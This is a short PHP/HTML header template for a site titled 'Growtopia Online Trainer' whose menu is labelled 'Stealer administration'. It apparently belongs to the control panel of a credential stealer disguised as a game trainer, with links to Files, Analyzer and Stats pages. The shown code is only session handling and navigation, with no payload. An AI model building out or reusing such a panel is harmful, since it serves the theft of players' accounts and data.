<?php
if(session_id())
 {
      // session has been started
 }
 else
 {
      // session has NOT been started
      session_start();
 } 
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Growtopia Online Trainer</title>
<link rel="stylesheet" href="/styles.css">
<link rel="shortcut icon" href="/icon.png">
<?php
if(isset($includeHead))
{
echo($includeHead);
}
?>
</head>
<body>
<script>
function myFunction() {
    var x = document.getElementById("navbar");
    if (x.className === "navigation") {
        x.className += " responsive";
    } else {
        x.className = "navigation";
    }
}
</script>
<div id="navbar" class="navigation">
<a href="javascript:void(0);" style="font-size:15px;" class="icon navit" onclick="myFunction()">Menu</a>
<!-- alt menu icon - work bad on mobiles &#9776; -->
<div class="navnam">Stealer administration</div>
<a href="/"><div class="navit">Home</div></a>
<?php
if(isset($_SESSION["isLoggedIn"]) && $_SESSION["isLoggedIn"]==true)
{
?>
<a href="/files.php"><div class="navit">Files</div></a>
<a href="/analyzer.php"><div class="navit">Analyzer</div></a>
<a href="/stats.php"><div class="navit">Stats</div></a>
<a href="/logout.php"><div class="navit">Log out</div></a>
<?php
}
?>
</div>
<div class="main">